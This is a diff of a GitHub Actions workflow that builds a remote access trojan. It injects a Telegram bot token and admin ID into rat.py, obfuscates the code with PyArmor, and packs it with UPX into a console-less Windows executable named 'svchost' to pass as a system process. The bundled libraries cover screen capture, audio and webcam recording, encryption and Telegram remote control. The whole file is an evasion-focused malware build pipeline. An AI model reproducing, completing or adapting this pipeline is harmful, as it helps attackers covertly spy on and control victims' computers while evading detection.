@@ -37,21 +37,21 @@ jobs:
       - name: Replace token and admin_id in rat.py
         run: |
           python -c "
-import re
-with open('rat.py', 'r', encoding='utf-8') as f:
-    content = f.read()
-content = content.replace('{{TOKEN}}', '${{ inputs.token }}')
-content = content.replace('{{ADMIN_ID}}', '${{ inputs.admin_id }}')
-with open('rat.py', 'w', encoding='utf-8') as f:
-    f.write(content)
-"
+          import re
+          with open('rat.py', 'r', encoding='utf-8') as f:
+              content = f.read()
+          content = content.replace('{{TOKEN}}', '${{ inputs.token }}')
+          content = content.replace('{{ADMIN_ID}}', '${{ inputs.admin_id }}')
+          with open('rat.py', 'w', encoding='utf-8') as f:
+              f.write(content)
+          "
       
       - name: Obfuscate with PyArmor
         run: |
           pyarmor obfuscate --recursive rat.py
           cp dist/rat.py rat_obf.py
       
-      - name: Build EXE with obfuscated code
+      - name: Build EXE (32-bit, без консоли, с UPX)
         run: |
           pyinstaller --onefile --windowed --name "svchost" --target-arch x86 --upx-dir="C:\ProgramData\chocolatey\lib\upx\tools" --hidden-import telegram --hidden-import telegram.ext --hidden-import PIL --hidden-import PIL.ImageGrab --hidden-import psutil --hidden-import requests --hidden-import sounddevice --hidden-import soundfile --hidden-import cryptography --hidden-import cryptography.fernet --hidden-import tkinter --hidden-import pycaw --hidden-import comtypes --hidden-import cv2 --hidden-import numpy --hidden-import GPUtil --hidden-import win10toast --collect-all telegram rat_obf.py
       
